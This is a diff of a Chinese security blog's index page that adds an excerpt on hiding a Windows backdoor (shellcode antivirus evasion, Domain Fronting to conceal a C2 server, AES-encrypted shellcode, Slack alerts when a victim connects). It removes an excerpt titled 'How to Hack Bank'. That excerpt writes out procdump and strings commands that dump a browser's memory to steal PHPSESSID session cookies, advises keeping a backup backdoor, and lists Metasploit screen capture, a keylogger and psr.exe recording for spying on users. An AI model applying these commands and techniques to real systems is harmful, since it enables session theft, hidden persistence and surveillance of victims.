@@ -117,6 +117,78 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windows后门隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-08-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
 		</h3>
 		</div>
@@ -501,108 +573,6 @@ hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-04-22  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
-</blockquote>
-<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
-strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
-findstr PHPSESSID * .dmp&gt; tmp
-strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
-<li>常用的操作用一个后门</li>
-<li>留一个备用的后门，第一个失效之后启用</li>
-</ol>
-<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
-<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
-post&#x2F;windows&#x2F;gather&#x2F;screen_spy
-
-再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
-
-
-使用Windows自带的PSR截屏：
-psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
-Start-Sleep -s 20;
-psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
-realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
-all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
-living that way. So I began to spend more time away from my computer, with other people, 
-learning to open myself to the world, to feel my emotions, to connect with others, to accept 
-risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
-more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
-my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
-</blockquote>
-<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
-strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
-findstr PHPSESSID * .dmp&gt; tmp
-strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
-<li>常用的操作用一个后门</li>
-<li>留一个备用的后门，第一个失效之后启用</li>
-</ol>
-<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
-<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
-post&#x2F;windows&#x2F;gather&#x2F;screen_spy
-
-再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
-
-
-使用Windows自带的PSR截屏：
-psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
-Start-Sleep -s 20;
-psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
-realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
-all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
-living that way. So I began to spend more time away from my computer, with other people, 
-learning to open myself to the world, to feel my emotions, to connect with others, to accept 
-risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
-more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
-my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -658,7 +628,7 @@ my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -679,6 +649,10 @@ my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
+      </li>
+    
+      <li>
         <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
       </li>
     
@@ -692,10 +666,6 @@ my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
     
       <li>
         <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
       </li>
     
   </ul>
